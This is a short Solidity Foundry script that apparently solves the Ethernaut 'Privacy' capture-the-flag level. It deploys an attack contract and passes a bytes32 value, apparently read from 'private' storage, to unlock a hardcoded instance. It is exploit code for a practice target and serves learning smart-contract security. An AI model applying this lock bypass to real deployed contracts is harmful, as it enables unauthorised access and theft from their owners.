// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Script.sol";
import "../src/PrivacyAttack.sol"; // 1) add file

contract SolvePrivacy is Script { // 2) change contractName

    function run() external {

        address target = 0x7639aD814cFdB93694e4eAE7797d7f33f369d31d; // 3) add ethernaut instance address
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        bytes32 data2 = 0x0e36f0ed60ec7f4dcb12fc36ab5eaae38f589a76fcc7e297966ded9a28505341;

        vm.startBroadcast(privateKey);

        PrivacyAttack attacker = new PrivacyAttack();

        attacker.attack(target, data2);

        console.log("Le lock est: ", IPrivacy(target).locked());

        vm.stopBroadcast();

    }
}